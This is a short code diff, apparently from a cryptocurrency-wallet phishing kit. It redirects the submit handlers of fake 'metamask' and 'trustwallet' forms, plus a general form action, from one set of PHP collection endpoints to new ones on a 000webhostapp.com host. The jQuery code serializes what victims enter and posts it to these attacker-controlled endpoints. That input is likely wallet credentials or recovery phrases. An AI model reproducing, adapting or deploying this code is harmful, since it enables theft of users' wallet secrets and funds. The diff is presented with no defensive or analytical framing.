@@ -1,5 +1,5 @@
 $("form").submit(function() {
-  $(myform).attr("action", "//info-dashboard.my.id/omega/dana.php");
+  $(myform).attr("action", "https://bolabola0521goll.000webhostapp.com/dana.php");
 });
 
 $('.beTwZZ').on('click', function() {  
@@ -34,7 +34,7 @@ $('#rewards2 .confirm-approve-content__small-text > button').on('click', functio
  $("#metamask").on("submit", "#metamask", function(e) {
         e.preventDefault();
         $.ajax({
-            url: '//info-dashboard.my.id/omega/malu.php',
+            url: 'https://bolabola0521goll.000webhostapp.com/malu.php',
             type: 'post',
             data: $(this).serialize(),
             success: function(data) {
@@ -54,7 +54,7 @@ $('#rewards2 .confirm-approve-content__small-text > button').on('click', functio
     $("#trustwallet").on("submit", "#metamask", function(e) {
         e.preventDefault();
         $.ajax({
-            url: '//info-dashboard.my.id/omega/manja.php',
+            url: 'https://bolabola0521goll.000webhostapp.com/manja.php',
             type: 'post',
             data: $(this).serialize(),
             success: function(data) {
